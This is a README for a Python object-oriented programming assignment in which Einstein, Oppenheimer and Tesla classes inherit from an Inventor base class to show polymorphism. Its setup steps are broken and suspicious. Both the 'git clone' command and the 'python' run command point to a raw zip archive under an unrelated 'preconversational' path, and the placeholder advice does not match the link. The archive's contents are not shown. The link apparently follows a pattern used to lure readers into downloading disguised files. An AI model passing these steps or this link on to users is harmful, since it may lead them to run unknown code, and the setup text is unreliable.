# Python OOP Assignment: Geniuses and Scholars

This repository contains a Python program that demonstrates key concepts of Object-Oriented Programming (OOP), including **classes**, **attributes**, **methods**, **inheritance**, and **polymorphism**. The project is inspired by the remarkable contributions of renowned scholars and inventors.

## **Assignment Objectives**

The code is structured to fulfill two main requirements:

### **1. Design Your Own Class**

-   **`Inventor` Class**: A base class is created to represent the fundamental attributes and behaviors of an inventor, such as `name` and `famous_for`.
-   **Constructors (`__init__`)**: Each object is initialized with unique values using the constructor.
-   **Inheritance**: The `Einstein`, `Oppenheimer`, and `Tesla` classes inherit from the `Inventor` base class, allowing them to share common behaviors while also having their own unique characteristics.

### **2. Polymorphism Challenge**

-   **Polymorphic Method (`create()`)**: Each of the derived classes (`Einstein`, `Oppenheimer`, `Tesla`) implements its own version of a common `create()` method.
-   **Dynamic Behavior**: The main program iterates through a list of different genius objects and calls the `create()` method on each one. Despite using the same method call, the output is different for each object, showcasing polymorphism.

## **How to Run the Program**

### **Prerequisites**

-   Python 3.x installed on your computer.

### **Steps**

1.  **Clone the Repository**:
    ```bash
    git clone [https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip](https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip)
    ```
    *(Remember to replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.)*

2.  **Navigate to the Project Directory**:
    ```bash
    cd your-repo-name
    ```

3.  **Execute the Script**:
    ```bash
    python https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip
    ```

The program will run and display the different actions of each scholar, demonstrating polymorphism in action.

## **Example Output**
Albert Einstein is renowned for their work on the Theory of Relativity. Albert Einstein is currently innovating... [Albert Einstein] is formulating the Theory of Relativity!
J. Robert Oppenheimer is renowned for their work on the Manhattan Project. J. Robert Oppenheimer is leading a team of brilliant minds. [J. Robert Oppenheimer] is building a new scientific device for The Manhattan Project.
Nikola Tesla is renowned for their work on AC electricity and wireless power. Nikola Tesla is experimenting with electrical currents. [Nikola Tesla] is demonstrating the power of AC electricity.
